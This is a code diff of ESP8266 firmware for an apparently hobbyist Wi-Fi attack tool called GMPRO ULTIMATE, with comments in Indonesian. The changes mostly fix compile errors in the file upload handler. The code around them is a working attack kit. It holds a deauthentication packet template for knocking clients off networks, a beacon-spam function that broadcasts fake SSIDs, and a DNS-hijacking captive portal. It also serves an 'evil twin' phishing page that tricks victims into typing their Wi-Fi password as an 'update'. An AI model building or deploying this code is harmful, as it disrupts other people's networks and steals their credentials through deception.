@@ -1,6 +1,5 @@
 /*
- * GMPRO ULTIMATE v5.1 - BATTLE READY (MULTI-BEACON UPDATE)
- * Features: SCAN, SELECT, DEAUTH, MASS KILL, BEACON (MULTI), EVIL TWIN, ROGUE PRANK + FILE MANAGER
+ * GMPRO ULTIMATE v5.2 - FIXED COMPILE VERSION
  */
 
 #include <ESP8266WiFi.h>
@@ -12,13 +11,11 @@ extern "C" {
   #include "user_interface.h"
 }
 
-// Konfigurasi Network
 const byte DNS_PORT = 53;
 IPAddress apIP(192, 168, 4, 1);
 DNSServer dnsServer;
 ESP8266WebServer webServer(80);
 
-// State System
 enum Mode { IDLE, DEAUTH_T, MASS_DEAUTH, BEACON_SPAM, EVIL_TWIN, PRANK };
 Mode currentMode = IDLE;
 
@@ -29,10 +26,11 @@ int targetChan = 1;
 String capturedPass = "None";
 unsigned long lastPktTime = 0;
 
-// Packet Templates
+// Variabel Global untuk File Upload agar tidak error saat compile
+File myTempFile; 
+
 uint8_t deauthPkt[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00};
 
-// ===== FUNGSI MULTI-BEACON (PENAMBAHAN) =====
 void spamSSID(String ssid) {
   uint8_t len = ssid.length();
   uint8_t packet[128] = { 
@@ -41,7 +39,7 @@ void spamSSID(String ssid) {
     0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x64, 0x00, 0x11, 0x04, 
     0x00, len 
   };
-  for (int i = 0; i < len; i++) packet[38 + i] = ssid[i];
+  for (int i = 0; i < len; i++) packet[38 + i] = (uint8_t)ssid[i];
   uint8_t end_pos = 38 + len;
   packet[end_pos++] = 0x01; packet[end_pos++] = 0x08; packet[end_pos++] = 0x82; packet[end_pos++] = 0x84;
   packet[end_pos++] = 0x8b; packet[end_pos++] = 0x96; packet[end_pos++] = 0x24; packet[end_pos++] = 0x30;
@@ -50,7 +48,7 @@ void spamSSID(String ssid) {
   wifi_send_pkt_freedom(packet, end_pos, 0);
 }
 
-// ===== UI ADMIN (PROGMEM) =====
+// UI ADMIN
 const char admin_html[] PROGMEM = R"rawliteral(
 <!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><style>
 :root{--g:#0f0;--r:#f00;--b:#0a0a0a;}
@@ -85,7 +83,6 @@ setInterval(stat,3000);
 </script></body></html>
 )rawliteral";
 
-// ===== UI LOGIN EVIL TWIN (PHISHING) =====
 const char phish_html[] PROGMEM = R"rawliteral(
 <!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><style>
 body{font-family:sans-serif;background:#f4f4f4;text-align:center;padding:20px;}
@@ -96,7 +93,6 @@ button{width:100%;padding:10px;background:#007bff;color:#fff;border:none;border-
 <form action="/post"><input type="password" name="pass" placeholder="Password WiFi" required><br><button type="submit">INSTALL UPDATE</button></form></div></body></html>
 )rawliteral";
 
-// --- UTILITY FUNCTIONS ---
 void parseBssid(String macStr, uint8_t* bssid) {
   int values[6];
   if (6 == sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5])) {
@@ -104,17 +100,19 @@ void parseBssid(String macStr, uint8_t* bssid) {
   }
 }
 
+// FUNGSI UPLOAD YANG SUDAH DIPERBAIKI (SANGAT KRUSIAL!)
 void handleFileUpload() {
   HTTPUpload& upload = webServer.upload();
   if (upload.status == UPLOAD_FILE_START) {
     String filename = upload.filename;
     if (!filename.startsWith("/")) filename = "/" + filename;
-    webServer._tempFile = LittleFS.open(filename, "w");
+    myTempFile = LittleFS.open(filename, "w");
   } else if (upload.status == UPLOAD_FILE_WRITE) {
-    if (webServer._tempFile) webServer._tempFile.write(upload.buf, upload.currentSize);
+    if (myTempFile) myTempFile.write(upload.buf, upload.currentSize);
   } else if (upload.status == UPLOAD_FILE_END) {
-    if (webServer._tempFile) webServer._tempFile.close();
-    webServer.send(200, "text/plain", "UPLOAD BERHASIL!");
+    if (myTempFile) {
+      myTempFile.close();
+    }
   }
 }
 
@@ -127,7 +125,6 @@ void setup() {
   WiFi.softAP("GMpro-Tool", "Sangkur87");
   dnsServer.start(DNS_PORT, "*", apIP);
 
-  // --- ROUTING ---
   webServer.on("/", []() {
     if (currentMode == PRANK) {
       File file = LittleFS.open("/index.html", "r");
@@ -147,7 +144,10 @@ void setup() {
     h += "<br><a href='/' style='color:cyan'>KEMBALI</a></body></html>";
     webServer.send(200, "text/html", h);
   });
-  webServer.on("/edit", HTTP_POST, [](){ webServer.send(200); }, handleFileUpload);
+  
+  webServer.on("/edit", HTTP_POST, [](){ 
+    webServer.send(200, "text/plain", "UPLOAD BERHASIL!"); 
+  }, handleFileUpload);
 
   webServer.on("/scan", []() {
     int n = WiFi.scanNetworks();
@@ -205,6 +205,7 @@ void setup() {
     if (currentMode == PRANK) {
       File file = LittleFS.open("/index.html", "r");
       if (file) { webServer.streamFile(file, "text/html"); file.close(); }
+      else { webServer.send(200, "text/html", "Gak ada index.html"); }
     } else if (currentMode == EVIL_TWIN) {
       webServer.send(200, "text/html", phish_html);
     } else {
@@ -218,7 +219,6 @@ void setup() {
 void loop() {
   dnsServer.processNextRequest();
   webServer.handleClient();
-
   unsigned long now = millis();
   
   if (currentMode == DEAUTH_T && now - lastPktTime > 100) {
@@ -238,7 +238,6 @@ void loop() {
     }
     lastPktTime = now;
   }
-  // ===== BAGIAN BEACON SPAM MULTI SSID =====
   else if (currentMode == BEACON_SPAM && now - lastPktTime > 100) {
     spamSSID("WIFI GRATIS KAGET");
     spamSSID("SINI ADA INTERNET");
